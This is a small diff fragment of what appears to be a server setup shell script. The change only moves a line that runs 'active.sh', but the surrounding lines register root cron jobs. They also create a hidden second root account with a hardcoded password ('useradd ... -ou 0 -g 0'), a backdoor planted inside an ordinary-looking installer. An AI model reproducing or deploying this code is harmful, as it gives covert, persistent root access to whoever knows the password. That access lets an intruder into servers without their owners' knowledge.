@@ -660,8 +660,6 @@ bash /root/deleted.sh
 EOF
 
 echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
-
-sh active.sh | tee -a  /root/active.sh
 }
 
 serviceenable () {
@@ -957,6 +955,7 @@ cat << EOF > /var/spool/cron/root
 */5 * * * * /bin/bash /root/auto >/dev/null 2>&1
 EOF
 
+sh active.sh | tee -a  /root/active.sh
 bash /root/auto
 
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
